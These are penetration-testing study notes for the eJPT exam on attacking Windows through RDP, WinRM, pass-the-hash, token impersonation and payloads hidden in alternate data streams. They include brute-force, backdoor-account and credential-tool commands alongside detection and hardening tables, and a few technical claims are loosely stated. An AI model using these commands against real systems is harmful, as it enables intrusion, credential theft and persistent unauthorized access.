# What is RDP?

RDP (Remote Desktop Protocol) is a Microsoft protocol that allows users to log into a Windows machine remotely with a graphical desktop.

- **Default port:** `TCP 3389`
- **Service name:** `Remote Desktop Services`
- **Layer:** Application layer
- **OS:** Windows

👉 Think of it as SSH with a GUI for Windows.

## 2️⃣ How RDP Works (Internals – Simple)

1. Client connects to the RDP port (3389 or custom)
2. TLS/SSL handshake occurs
3. User authenticates (password / NTLM / Kerberos)
4. Windows creates a desktop session
5. Keyboard, mouse, screen data is tunneled

```
Attacker → TCP 3389 → Windows Login → Desktop Session
```

## 3️⃣ Why Attackers Love RDP

| Reason | Explanation |
|--------|-------------|
| Legitimate admin access | Looks normal in logs |
| Full GUI | Easier than shell |
| Credential reuse | Common weak passwords |
| Pass-the-Hash | Password not required |
| Persistence | Enable RDP = long-term access |

## 4️⃣ Detecting RDP on a Target

### 🔍 Using Nmap

```bash
nmap -p 3389 target
```

### 🔍 Non-default port (very common)

```bash
nmap -p- target
```

Attackers often change RDP to ports like 3333, 3390, 4444.

## 5️⃣ Identifying RDP on Custom Port (Metasploit)

```bash
msfconsole
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS target
set RPORT 3333
run
```

✅ Confirms whether a port is actually RDP.

## 6️⃣ RDP Brute-Forcing (Credential Attack)

### Using Hydra

```bash
hydra -L users.txt -P passwords.txt rdp://target -s 3333
```

- ⚠️ Slow and noisy
- ⚠️ Can cause account lockout
- ⚠️ Usually last resort

## 7️⃣ Logging in via RDP (xfreerdp)

### Normal login

```bash
xfreerdp /u:username /p:password /v:target
```

### Custom port

```bash
xfreerdp /u:admin /p:pass /v:target:3333
```

## 8️⃣ RDP + Pass-the-Hash (Very Important)

RDP supports NTLM authentication, meaning:

👉 You can log in using ONLY the NTLM hash

```bash
xfreerdp /u:Administrator /pth:<NTLM_HASH> /v:target
```

- ✅ No password cracking
- ✅ Very stealthy
- ✅ Common in real attacks

## 9️⃣ RDP vs PsExec (Quick Comparison)

| Feature | RDP | PsExec |
|---------|-----|--------|
| GUI | Yes | No |
| Access level | User | SYSTEM |
| Uses credentials | Yes | Yes |
| Stealth | High | Medium |
| Lateral movement | Excellent | Excellent |

🔑 **Attackers often use PsExec first, RDP later**

## 🔐 10️⃣ Enabling RDP (Post-Exploitation)

### Enable RDP

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" \
/v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Add user to RDP group

```bash
net localgroup "Remote Desktop Users" user /add
```

## 🚨 11️⃣ RDP Logs (Blue Team View)

| Event ID | Meaning |
|----------|---------|
| 4624 | Successful login |
| 4625 | Failed login |
| 1149 | RDP authentication |
| 21 | RDP session start |
| 24 | RDP session disconnect |

## 🛡️ 12️⃣ How to Secure RDP

| Defense | Effect |
|---------|--------|
| Disable RDP | Best |
| Network Level Auth | Strong |
| MFA | Excellent |
| Firewall allowlist | Strong |
| Change port | Weak but helpful |
| Account lockout | Stops brute-force |

## 🎓 RDP in eJPT / INE Exams

You are expected to know:
- Default port (3389)
- RDP can run on custom ports
- How attackers brute-force or reuse creds
- Difference between RDP and exploits
- How to log in using xfreerdp
---
# 1️⃣ What is BlueKeep?

BlueKeep is a critical Remote Desktop Protocol (RDP) vulnerability that allows an attacker to achieve Remote Code Execution (RCE) on a Windows system without authentication.

- **CVE:** CVE-2019-0708
- **Service affected:** RDP
- **Default port:** TCP 3389
- **Severity:** 🔥 Critical (Wormable)

"Wormable" means it can spread automatically like WannaCry.

## 2️⃣ Which Systems Are Vulnerable?

### ❌ Vulnerable (Unpatched):

- Windows XP
- Windows Vista
- Windows 7
- Windows Server 2003
- Windows Server 2008 / 2008 R2

### ✅ Not Vulnerable:

- Windows 8+
- Windows 10 (all supported versions)
- Modern Windows Server versions (2012+)

## 3️⃣ Why Was BlueKeep So Dangerous?

| Feature | Why it's bad |
|---------|--------------|
| No authentication | No username/password needed |
| Pre-login exploit | Attacks before Windows login |
| Kernel-level bug | Full system compromise |
| Wormable | Can auto-spread across networks |

Microsoft took the rare step of patching Windows XP, which tells you how serious this was.

## 4️⃣ How BlueKeep Works (Conceptual)

⚠️ Conceptual explanation only (no exploit code)

1. Attacker connects to RDP service
2. Sends malformed RDP packets
3. Triggers memory corruption
4. Executes code in kernel context
5. Attacker gains SYSTEM access

```
Attacker ──► RDP ──► Memory corruption ──► Kernel RCE ──► SYSTEM
```

## 5️⃣ Is BlueKeep "Zero-Click"?

✅ Yes — but with conditions

| Question | Answer |
|----------|--------|
| User interaction required? | ❌ No |
| Login required? | ❌ No |
| Click required? | ❌ No |
| Network access required? | ✅ Yes (RDP exposed) |

**BlueKeep is a pre-auth, zero-click RCE**

That's why it was so scary.

## 6️⃣ How Attackers Used BlueKeep (Historically)

- Internet-exposed RDP servers
- Unpatched legacy Windows
- Internal networks (lateral worming)
- Cryptomining worms
- Targeted ransomware attempts

⚠️ **Real-world exploitation was rare**

Most attackers chose credential attacks instead (more reliable).

## 7️⃣ Why You Rarely See BlueKeep in Labs

| Reason | Explanation |
|--------|-------------|
| Unstable exploit | Easy to crash the system |
| Kernel exploit | Hard to weaponize |
| Patched everywhere | Almost all systems fixed |
| Dangerous | Can crash exam lab |

👉 That's why eJPT focuses on RDP creds, not BlueKeep

## 8️⃣ Detection & Mitigation

### 🔍 Detection

```bash
nmap --script rdp-vuln-ms12-020 -p 3389 target
```

(Some scripts were updated post-BlueKeep)

### 🛡️ Mitigation

- Patch Windows
- Disable RDP if unused
- Enable Network Level Authentication (NLA)
- Firewall RDP (internal only)
- VPN + MFA

## 9️⃣ BlueKeep vs Modern RDP Attacks

| BlueKeep | Modern RDP Attacks |
|----------|-------------------|
| Exploit-based | Credential-based |
| Rare | Very common |
| Kernel RCE | User login |
| Loud | Stealthy |
| Unreliable | Reliable |

💡 **Today's attackers prefer stolen credentials over exploits.**
---
# 1️⃣ What is WinRM?

WinRM (Windows Remote Management) is Microsoft's implementation of WS-Management, used to remotely execute commands and manage Windows systems.

**Think of it as:**

PowerShell remoting over HTTP/HTTPS

## 📌 Key Facts

| Item | Value |
|------|-------|
| Default ports | 5985 (HTTP), 5986 (HTTPS) |
| Protocol | SOAP over HTTP(S) |
| Authentication | NTLM, Kerberos |
| Access | Command-line (no GUI) |
| Used by | Sysadmins, automation, attackers |

## 2️⃣ Why WinRM Exists (Admin View)

Admins use WinRM to:
- Run PowerShell commands remotely
- Manage servers without RDP
- Automate tasks (Ansible, SCCM, Azure)

### Example (legitimate admin use):

```powershell
Enter-PSSession -ComputerName target
```

## 3️⃣ Why Attackers Love WinRM

| Reason | Why it's powerful |
|--------|------------------|
| Uses valid credentials | Looks legitimate |
| No malware needed | Fileless |
| Firewall-friendly | HTTP/HTTPS |
| Supports Pass-the-Hash | No password cracking |
| Works when SMB is blocked | Common in enterprises |

👉 WinRM is stealthier than PsExec

## 4️⃣ How WinRM Works (Simplified)

1. Attacker connects to port 5985/5986
2. Authenticates (password or NTLM hash)
3. PowerShell session is created
4. Commands are executed remotely

```
Attacker → WinRM → PowerShell → Command Execution
```

## 5️⃣ Detecting WinRM on a Target

### Using Nmap

```bash
nmap -p 5985,5986 target
```

### Using Nmap scripts

```bash
nmap -p 5985 --script winrm-info target
```

## 6️⃣ Authenticating to WinRM (Attacker Side)

### Using Evil-WinRM (most common tool)

**Password login**

```bash
evil-winrm -i target -u Administrator -p password
```

**Pass-the-Hash**

```bash
evil-winrm -i target -u Administrator -H <NTLM_HASH>
```

✅ This gives you a PowerShell shell.

## 7️⃣ WinRM vs RDP vs PsExec

| Feature | WinRM | RDP | PsExec |
|---------|-------|-----|--------|
| GUI | ❌ | ✅ | ❌ |
| Stealth | ⭐⭐⭐⭐ | ⭐⭐ | ⭐⭐⭐ |
| Uses SMB | ❌ | ❌ | ✅ |
| Firewall friendly | ✅ | ❌ | ❌ |
| SYSTEM access | ❌ (by default) | ❌ | ✅ |

👉 Modern attackers prefer WinRM first

## 8️⃣ WinRM + Pass-the-Hash (Important)

WinRM supports NTLM authentication:

```bash
evil-winrm -i target -u user -H <hash>
```

- No password needed
- No brute-force
- Very stealthy

## 9️⃣ Common WinRM Privilege Issues

WinRM does NOT automatically give SYSTEM access.

**You usually get:**
- Administrator user context
- Need privilege escalation for SYSTEM

**Typical next steps:**
- UAC bypass
- Token impersonation
- Service abuse

## 🔐 10️⃣ Securing WinRM (Blue Team)

| Defense | Effect |
|---------|--------|
| Disable WinRM if unused | Best |
| Restrict via firewall | Strong |
| Use HTTPS (5986) | Better |
| MFA | Excellent |
| Logging | Detect misuse |

## 🚨 11️⃣ WinRM Logs to Watch

| Event ID | Meaning |
|----------|---------|
| 4624 | Successful login |
| 4625 | Failed login |
| 4688 | Process creation |
| PowerShell logs | Script execution |

## 🎓 WinRM in eJPT / INE

You are expected to know:
- What WinRM is
- Default ports (5985/5986)
- Evil-WinRM usage
- Difference vs RDP & SMB
---
# Exploiting WinRM (Windows Remote Management) — Step by Step

## 🎯 Goal

Gain remote command execution on a Windows machine via WinRM, then understand how attackers abuse it for lateral movement and persistence.

⚠️ WinRM exploitation is credential-based, not a memory exploit like EternalBlue.

## Step 1: Identify WinRM on the Target

WinRM runs on:
- 5985 → HTTP
- 5986 → HTTPS

### Command

```bash
nmap -p 5985,5986 target
```

### Why this matters

- If WinRM is open, remote PowerShell execution is possible
- Modern enterprises prefer WinRM over SMB

### 📌 Expected Output

```
5985/tcp open  http
```

## Step 2: Confirm WinRM Service

(Optional but good practice)

```bash
nmap -p 5985 --script winrm-info target
```

This confirms:
- WinRM is enabled
- Authentication method
- Server details

## Step 3: Obtain Credentials (Pre-requisite)

WinRM requires valid credentials.

### Common ways attackers get them:

- SMB brute force
- FTP brute force
- XML / config leaks
- Credential dumping (LSASS)
- Password reuse

### Example:

```
Administrator : password123
```

## Step 4: Exploit WinRM Using Evil-WinRM

### Tool Used

**Evil-WinRM** 👉 Industry-standard tool for WinRM exploitation

### 4️⃣ Password-based Login

```bash
evil-winrm -i target -u Administrator -p password123
```

### What happens internally

1. Connects to WinRM service
2. Authenticates via NTLM/Kerberos
3. Spawns a remote PowerShell session

### 📌 Result

```
*Evil-WinRM* PS C:\Users\Administrator>
```

🎉 You now have remote command execution

## Step 5: WinRM + Pass-the-Hash (Very Important)

If you don't have the password but have the NTLM hash:

```bash
evil-winrm -i target -u Administrator -H <NTLM_HASH>
```

- ✅ No password cracking
- ✅ Extremely stealthy
- ✅ Very common in real attacks

## Step 6: Validate Access Level

Inside Evil-WinRM:

```powershell
whoami
whoami /groups
```

### Typical output:

```
nt authority\system ❌
administrator ✅
```

📌 **Important:** WinRM usually gives Administrator, not SYSTEM.

## Step 7: Post-Exploitation via WinRM

Once inside, attackers typically:

### 🔹 Enumerate system

```powershell
systeminfo
hostname
ipconfig
```

### 🔹 Dump credentials (if allowed)

```powershell
whoami /priv
```

Look for:

```
SeDebugPrivilege
```

### 🔹 Upload tools

```powershell
upload mimikatz.exe
```

### 🔹 Enable RDP for GUI access

```powershell
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /d 0 /f
```

## Step 8: Privilege Escalation (If Needed)

Since WinRM is user-level, attackers escalate using:
- Token impersonation
- UAC bypass
- Service misconfigurations
- Scheduled tasks

### Example:

```powershell
whoami /priv
```

If `SeImpersonatePrivilege` is enabled → Potato attacks

## Step 9: Lateral Movement Using WinRM

Attackers reuse credentials:

```bash
evil-winrm -i 192.168.1.20 -u Administrator -H <hash>
```

➡️ This is how domain compromise spreads silently

## Step 10: Persistence Using WinRM

Attackers may:
- Create new admin users
- Enable WinRM permanently
- Add firewall rules
- Schedule tasks

### Example:

```powershell
net user backdoor Pass@123 /add
net localgroup administrators backdoor /add
```

## 🧠 Why WinRM Is Preferred Over SMB

| Feature | WinRM | SMB |
|---------|-------|-----|
| Firewall friendly | ✅ | ❌ |
| Fileless | ✅ | ❌ |
| Stealth | ⭐⭐⭐⭐ | ⭐⭐ |
| Uses HTTP | ✅ | ❌ |
| Cloud friendly | ✅ | ❌ |

👉 Modern attackers prefer WinRM

## 🚨 Detection (Blue Team Awareness)

WinRM abuse triggers:
- Event ID 4624 (Logon)
- PowerShell Script logs
- WinRM operational logs

Harder to detect than SMB or PsExec.
---
# Why do we do `sysinfo → hotfixes → windows-exploit-suggester.py`?

This chain answers one critical question:

❓ **"Is this Windows system missing a patch that lets me become SYSTEM?"**

## 🧠 The Big Picture (Mental Model)

Windows privilege escalation depends heavily on missing patches.

Microsoft fixes vulnerabilities using hotfixes / security updates. If a hotfix is missing, the vulnerability still exists.

So attackers do this:

```
Identify OS + Patch level
 → Compare against known exploits
 → Find a working local privilege escalation
```

That's exactly what this workflow does.

## STEP 1️⃣ `sysinfo` — Identify the OS

### Command (Meterpreter)

```bash
sysinfo
```

### What this tells you

- Windows version
- Architecture (x86 / x64)
- Build number
- Service Pack

### Example output:

```
OS Name: Windows 7
OS Version: 6.1.7601 Service Pack 1
Architecture: x64
```

### ❓ Why this matters

Kernel exploits are:
- OS-specific
- Build-specific
- Architecture-specific

An exploit for:
- Windows 7 x86 ❌ won't work on Windows 10 x64

So `sysinfo` defines what exploits are even possible.

## STEP 2️⃣ `hotfixes` — Find What's Patched

### Command

```bash
hotfixes
```

### What are hotfixes?

Hotfixes are Windows updates, usually shown as:

```
KB4012212
KB4012215
KB4509091
```

Each KB number corresponds to:
- A security patch
- One or more fixed vulnerabilities

### Example output

```
Hotfix(s):
KB976902
KB4012212
KB4012215
```

### ❓ WHY Hotfixes Are Crucial

Every Windows exploit says something like:

❌ "Fixed in KB4012212"

So:
- If KB4012212 is installed → exploit won't work
- If KB4012212 is missing → exploit might work

👉 Hotfixes tell you what is NOT exploitable

## STEP 3️⃣ Why Humans Can't Do This Manually

Let's say you have:
- Windows 7 SP1
- 15 hotfixes installed
- Hundreds of known exploits

Manually checking:
- CVEs
- KB numbers
- OS builds

❌ Impossible during an exam or real pentest.

That's why we use Windows Exploit Suggester.

## STEP 4️⃣ `windows-exploit-suggester.py` — The Magic Tool

### What it does

It:
1. Takes OS version
2. Takes installed hotfix list
3. Compares against Microsoft's CVE database
4. Outputs possible missing-patch exploits

**In simple words:**

"Based on what's NOT patched, here are exploits you can try."

## STEP 5️⃣ Feeding It the Data

You extract:
- OS info → from `sysinfo`
- Hotfix list → from `hotfixes`

Then run:

```bash
python windows-exploit-suggester.py \
--database 2024-xx-xx-mssb.xlsx \
--systeminfo sysinfo.txt
```

Or manually supply hotfix list.

## STEP 6️⃣ Output Interpretation (Very Important)

### Example output:

```
[+] CVE-2016-0099 | MS16-032 | x64 | LOCAL | EoP
[+] CVE-2018-8120 | Win32k Elevation
```

### What this means:

- **LOCAL** → Needs an existing shell
- **EoP** → Elevation of Privilege
- Matches your OS
- Patch not found → exploitable

This narrows 1000 exploits → 2–3 candidates

## STEP 7️⃣ Why This Is the Correct Workflow

| Step | Why it exists |
|------|---------------|
| `sysinfo` | Identify OS constraints |
| `hotfixes` | Identify patch level |
| Exploit suggester | Map missing patches → exploits |

Skipping any step = guessing blindly.

## STEP 8️⃣ Why This Is Used in Exams (eJPT / INE)

Because it tests:
- Enumeration
- Logical thinking
- Not "exploit spamming"

Examiners want to see:

**"Does the student understand why an exploit works?"**

## ⚠️ Important Reality Check

Even if the exploit is suggested:
- It may crash
- It may fail
- It may require tweaks

Kernel exploits are not guaranteed.

That's why:

**Credential abuse > kernel exploits**

## 🧠 One-Line Summary

We use `sysinfo → hotfixes → windows-exploit-suggester` to identify missing Windows patches and safely determine which local privilege-escalation exploits might work—without guessing.
---
# 🎭 Impersonating Tokens — Explained Cleanly & Practically (Windows / Meterpreter)

Token impersonation is one of the most important Windows privilege escalation techniques you'll see in labs, real attacks, and certifications like eJPT.

I'll break it down step-by-step, with why, how, and where it fits in your attack chain.

## 1️⃣ What Is a Windows Access Token?

In Windows, everything runs with a token.

### A token contains:

- User identity (username, SID)
- Group memberships (Administrators, SYSTEM, etc.)
- Privileges (SeDebugPrivilege, SeImpersonatePrivilege)
- Integrity level (Low / Medium / High / SYSTEM)

🔑 **If you control a token, you control what that user can do.**

## 2️⃣ What Does "Impersonating a Token" Mean?

**Impersonation =**

👉 Temporarily act as another user without knowing their password.

### Example:

- You are `web_user`
- A SYSTEM service authenticates to you
- You steal its token
- You now execute commands as SYSTEM

- ✔ No exploit
- ✔ No password
- ✔ No crash

## 3️⃣ When Token Impersonation Is Possible

Token impersonation works only if:

- A privileged process connects to you
- OR a service runs under SYSTEM and exposes a token
- AND your process has impersonation privileges

### Most important privileges:

- `SeImpersonatePrivilege` ✅
- `SeAssignPrimaryTokenPrivilege` ✅

## 4️⃣ Why Token Impersonation Is So Powerful

| Reason | Explanation |
|--------|-------------|
| Passwordless | No cracking |
| Stealthy | No exploit |
| Reliable | Works on patched systems |
| Fast | Seconds |
| Exam favorite | Very common |

That's why attacks like:
- Juicy Potato
- PrintSpoofer
- RoguePotato
- GodPotato

are everywhere.

## 5️⃣ Token Impersonation in Meterpreter (Basic)

### 🔍 Step 1: Check privileges

```bash
meterpreter > getprivs
```

Look for:
- `SeImpersonatePrivilege`

If present → 🎯 You're in business

### 🔍 Step 2: List available tokens

```bash
meterpreter > list_tokens -u
```

You might see:
- `NT AUTHORITY\SYSTEM`
- `NT AUTHORITY\NETWORK SERVICE`
- `VICTIM\Administrator`

### 🔍 Step 3: Impersonate a token

```bash
meterpreter > impersonate_token "NT AUTHORITY\SYSTEM"
```

### 🔍 Step 4: Verify

```bash
meterpreter > getuid
```

Output:
```
NT AUTHORITY\SYSTEM
```

🎉 **You are now SYSTEM.**

## 6️⃣ Why Token Impersonation Often Fails Without Migration

Your original shell might be:
- 32-bit
- Running in IIS
- Low integrity
- Restricted process

That's why you did:

```bash
pgrep explorer
migrate <PID>
```

### Explorer.exe:

- Is user-interactive
- Has better token access
- Can interact with privileged services

➡️ **Migration increases token visibility**

## 7️⃣ Token Impersonation vs UACMe

| Feature | Token Impersonation | UACMe |
|---------|-------------------|-------|
| Requires admin | ❌ | ✅ |
| Works as user | ✅ | ❌ |
| Requires service interaction | ✅ | ❌ |
| Bypasses UAC | ❌ | ✅ |
| Gets SYSTEM | ✅ | ✅ |

**They are complementary, not competing.**

## 8️⃣ Token Impersonation in Real Attacks

Classic example:

```
Web server (IIS)
  ↓
Service account with SeImpersonatePrivilege
  ↓
PrintSpoofer / JuicyPotato
  ↓
SYSTEM shell
```

This is why Print Spooler bugs are deadly.

## 9️⃣ Token Impersonation in CrackMapExec / Tools

CrackMapExec itself doesn't impersonate tokens, but it:
- Executes commands
- Deploys payloads
- Drops token-abuse binaries

### Example flow:

```
CME → upload PrintSpoofer → execute → SYSTEM shell
```

## 🔥 Common Token Impersonation Tools

| Tool | Works When |
|------|-----------|
| JuicyPotato | Old Windows |
| RoguePotato | Newer Windows |
| PrintSpoofer | Print Spooler enabled |
| GodPotato | Modern Windows |
| Meterpreter | Token already available |

## 🧠 Exam-Oriented Mental Model (IMPORTANT)

If you see:
- Windows
- Service account
- `SeImpersonatePrivilege`
- `getsystem` fails

👉 **Think: Token impersonation**

## 🔚 Final Summary

**Impersonating tokens means:**
- Stealing identity, not passwords
- Using Windows trust against itself
- Gaining SYSTEM without exploits
- One of the most reliable escalation paths
---
# 1️⃣ `start windowslog.txt:winpeas.exe` → Access is denied

## ✅ Why this happens (core reason)

Windows does NOT allow direct execution of EXEs from Alternate Data Streams.

Even though:
- NTFS stores executables in ADS ✅
- Windows blocks loading them as programs ❌

This is enforced by:
- Windows loader restrictions
- Defender / AMSI / policy checks

📌 **This is by design, not a syntax issue.**

So this will almost always fail:

```cmd
start windowslog.txt:winpeas.exe
```

Even with correct syntax.

# 2️⃣ `mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe`

```
You do not have sufficient privilege
```

## ❌ Why this fails

`mklink` requires:
- Administrator privileges
- OR Developer Mode enabled

You are running as a standard user, so Windows blocks it.

✔️ **Again: expected behavior**

# 3️⃣ Important Reality Check (very important)

❗ **ADS is for hiding data, NOT for direct execution.**

### Real-world truth:

Attackers do not execute payloads directly from ADS.

They:
1. Hide payload in ADS
2. Extract it (disk or memory)
3. Execute via allowed mechanism

# 4️⃣ ✅ The CORRECT way to proceed (works everywhere)

## 🔹 Step 1: Extract the ADS payload

```cmd
more < windowslog.txt:winpeas.exe > winpeas.exe
```

✔️ This copies the hidden stream into a real executable.

## 🔹 Step 2: Execute normally

```cmd
winpeas.exe
```

That's it.

This is:
- ✔️ Realistic
- ✔️ Used in CTFs
- ✔️ Used in real incident response cases

# 5️⃣ Why Windows blocks ADS execution (security insight)

If Windows allowed this:

```cmd
start file.txt:evil.exe
```

Then:
- Every text file could hide malware
- AV scanning would be bypassed easily
- Forensics would be unreliable

So Microsoft allows:
- 📦 **Storage** → YES
- ▶️ **Execution** → NO

# 6️⃣ What you've successfully learned 👏

You have already mastered:
- ✅ NTFS Alternate Data Streams
- ✅ Hidden payload storage
- ✅ Windows privilege boundaries
- ✅ Why LOLBins fail without elevation
- ✅ Real attacker vs beginner misconceptions

**This is actual red-team / blue-team knowledge, not gimmicks.**

# 7️⃣ TL;DR

| Attempt | Result | Reason |
|---------|--------|--------|
| `start ADS.exe` | ❌ | Windows blocks ADS execution |
| `mklink` | ❌ | Needs admin |
| ADS storage | ✅ | NTFS allows |
| Extract → run | ✅ | Correct method |
---
